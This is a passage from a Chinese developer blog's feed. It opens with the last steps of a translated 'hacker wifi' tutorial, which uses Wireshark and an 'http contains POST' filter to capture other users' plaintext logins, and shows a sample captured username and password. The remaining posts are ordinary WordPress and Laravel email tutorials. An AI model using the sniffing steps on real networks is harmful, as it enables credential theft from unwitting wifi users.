<h4 id="第十二步">第十二步</h4><p>开<code>wireshark</code>，命令如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wireshark&amp;</span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong><br><code>wireshark</code>是个网络协议抓包分析器。<br><img src="http://static.blog.lurrpis.com/wifi12.png" alt="image"></p>
<h4 id="第十三步">第十三步</h4><p>选择网卡，点开始<code>（start）</code><br><img src="http://static.blog.lurrpis.com/wifi13.png" alt="image"></p>
<h4 id="第十四步">第十四步</h4><p>输入<code>http contains POST</code>过滤一下，然后你就可以看到所有抓下来的数据包了。<br><img src="http://static.blog.lurrpis.com/wifi14.png" alt="image"><br><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="label">http:</span>//exploit.deepanshukapoor<span class="preprocessor">.org</span>/admin.php</span><br><span class="line">Username – john </span><br><span class="line">Password – <span class="number">1234</span></span><br></pre></td></tr></table></figure></p>
<p><img src="http://static.blog.lurrpis.com/wifi15.png" alt="image"></p>
<blockquote class="blockquote-center" style="margin:120px 0px;"><i class="fa fa-ban"></i> 声明<br>本文章仅供交流学习使用<br>请勿外出实(zuo)践(si)<br></blockquote>]]></content>
    <summary type="html">
    <![CDATA[<h4 id="前言">前言</h4><blockquote>
<p>先说明一下，这个文章不是我写的，是一个老外<code>Deepanshu Kapoor</code>安全专家写的，我一开始就是看着玩，但整个看完被老外那个细心和耐心给打动了，整个过程其实很简单，但是老外分了好多]]>
    </summary>
    
      <category term="3.15黑客wifi" scheme="http://lurrpis.com/tags/3-15%E9%BB%91%E5%AE%A2wifi/"/>
    
      <category term="黑客wifi教程" scheme="http://lurrpis.com/tags/%E9%BB%91%E5%AE%A2wifi%E6%95%99%E7%A8%8B/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WordPress分类页代码]]></title>
    <link href="http://lurrpis.com/17.html"/>
    <id>http://lurrpis.com/17.html</id>
    <published>2015-03-17T06:57:13.000Z</published>
    <updated>2015-03-17T07:38:51.000Z</updated>
    <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>今天做需求时，突然发现很久以前使用WordPress写的一个项目的分类功能不能使用了，分类页面内的文章并没有进行分类，原来是WordPress之后更新，出现了兼容性BUG</p>
<h4 id="文件路径">文件路径</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">webroot/wp-<span class="attribute">content</span>/themes/xxx/archive<span class="class">.php</span>  <span class="comment">//分类模板</span></span><br></pre></td></tr></table></figure>
<p>查找<code>have_posts()</code>，一般这句话之下就是文章列表遍历<br>在<code>have_posts()</code>之上插入，<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$categories</span> = get_the_category(<span class="variable">$post</span>-&gt;ID);</span><br><span class="line"><span class="variable">$args</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'cat'</span>=&gt;<span class="variable">$categories</span>[<span class="number">0</span>]-&gt;term_id,   <span class="comment">//当前分类文章</span></span><br><span class="line">                <span class="string">'showposts'</span> =&gt; <span class="number">20</span>,  <span class="comment">//文章列表分页</span></span><br><span class="line">                <span class="string">'paged'</span> =&gt; <span class="variable">$paged</span></span><br><span class="line">            );</span><br><span class="line">            query_posts(<span class="variable">$args</span>);</span><br></pre></td></tr></table></figure></p>
<h4 id="做个广告">做个广告</h4><p><a href="http://www.evhui.com" target="_blank" style="color:red">电车汇 evhui.com</a>是一个聚合关于新能源电动车的最新政策，国家福利，新能源补贴，评测，充电桩定位(后续产品)的电车资源首发网站。</p>
<p>一开始让我说他们有独家政策补贴消息其实我是拒绝的，因为，你不能让我说，我就马上去说，第一我要试一下，因为我不愿意说完了以后再加一些特技上去，政策补贴duang~~一下，很多，很假，这样人们出来一定会骂我，根本没有这样的补贴，就证明上面那个是假的，后来我也经过证实他们消息确实是独家的，我关注了大概一个月左右，感觉还不错，后来我在的时候也要求他们不要加特技，因为我要让人们看到，算好政策补贴买电动车 <i class="fa fa-car"></i> 就像买电动车 <i class="fa fa-bicycle"></i></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="前言">前言</h3><p>今天做需求时，突然发现很久以前使用WordPress写的一个项目的分类功能不能使用了，分类页面内的文章并没有进行分类，原来是WordPress之后更新，出现了兼容性BUG</p>
<h4 id="文件路径">文件路径</h4><figu]]>
    </summary>
    
      <category term="WordPress" scheme="http://lurrpis.com/tags/WordPress/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何在Laravel中使用SMTP发送邮件(适用于各主流邮箱)]]></title>
    <link href="http://lurrpis.com/12.html"/>
    <id>http://lurrpis.com/12.html</id>
    <published>2015-03-13T04:05:49.000Z</published>
    <updated>2015-03-13T04:26:10.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>Laravel 提供了非常简单的邮件发送 API，但是文档却不是太清晰，再加上它采用传递闭包（回调函数）的方式调用，导致邮件发送的使用门槛偏高。</p>
<p>Laravel 4 和 Laravel 5 的邮件发送使用方式完全一致。Laravel 5 的邮件发送中文文档在：<a href="http://laravel-china.org/docs/5.0/mail" target="_blank" rel="external">http://laravel-china.org/docs/5.0/mail</a></p>
<p>本文中，我将以 163 邮箱为例，展示如何用 Laravel 内置的邮件发送类来发送邮件。</p>
</blockquote>
<h3 id="配置">配置</h3><p>修改邮件发送配置。4.2 在 <code>app/config/mail.php</code>，5 在 <code>config/mail.php</code>，修改以下配置：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">'host'</span> =&gt; <span class="string">'smtp.163.com'</span>,</span><br><span class="line"><span class="string">'port'</span> =&gt; <span class="number">25</span>,</span><br><span class="line"><span class="string">'from'</span> =&gt; <span class="keyword">array</span>(<span class="string">'address'</span> =&gt; <span class="string">'***@163.com'</span>, <span class="string">'name'</span> =&gt; <span class="string">'TestMail'</span>),</span><br><span class="line"><span class="string">'username'</span> =&gt; <span class="string">'***@163.com'</span>, <span class="comment">// 注意，这里必须和上一行配置里面的邮件地址一致</span></span><br><span class="line"><span class="string">'password'</span> =&gt; <span class="string">'****'</span>,</span><br></pre></td></tr></table></figure></p>
<h3 id="发送">发送</h3><p>在控制器或者模型里，调用以下代码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = [<span class="string">'email'</span>=&gt;<span class="variable">$email</span>, <span class="string">'name'</span>=&gt;<span class="variable">$name</span>, <span class="string">'uid'</span>=&gt;<span class="variable">$uid</span>, <span class="string">'activationcode'</span>=&gt;<span class="variable">$code</span>];</span><br><span class="line"><span class="keyword">return</span> Mail::send(<span class="string">'activemail'</span>, <span class="variable">$data</span>, <span class="function"><span class="keyword">function</span><span class="params">(<span class="variable">$message</span>)</span> <span class="title">use</span><span class="params">(<span class="variable">$data</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="variable">$message</span>-&gt;to(<span class="variable">$data</span>[<span class="string">'email'</span>], <span class="variable">$data</span>[<span class="string">'name'</span>])-&gt;subject(<span class="string">'欢迎注册我们的网站，请激活您的账号！'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>邮件视图为 <code>views/activemail.blade.php</code>：<br><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="doctype">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span> <span class="attribute">lang</span>=<span class="value">"zh-CN"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">charset</span>=<span class="value">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">http-equiv</span>=<span class="value">"X-UA-Compatible"</span> <span class="attribute">content</span>=<span class="value">"IE=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"</span></span></span><span class="expression">&#123;&#123; <span class="variable">URL</span>('<span class="variable">active</span>?<span class="variable">uid</span>='<span class="variable">.</span>$<span class="variable">uid.</span>'&amp;<span class="variable">activationcode</span>='<span class="variable">.</span>$<span class="variable">activationcode</span>) &#125;&#125;</span><span class="xml"><span class="tag"><span class="value">"</span> <span class="attribute">target</span>=<span class="value">"_blank"</span>&gt;</span>点击激活你的账号<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h3 id="搞定!">搞定!</h3><hr>
<p>转载自吕文瀚-岁寒<a href="http://lvwenhan.com/laravel/436.html" target="_blank" rel="external">http://lvwenhan.com/laravel/436.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>Laravel 提供了非常简单的邮件发送 API，但是文档却不是太清晰，再加上它采用传递闭包（回调函数）的方式调用，导致邮件发送的使用门槛偏高。</p>
<p>Laravel 4 和 Laravel 5 的邮件发送使用方式完全一致。Laravel ]]>
    </summary>
    
      <category term="laravel" scheme="http://lurrpis.com/tags/laravel/"/>
    
      <category term="发送邮件" scheme="http://lurrpis.com/tags/%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
</feed>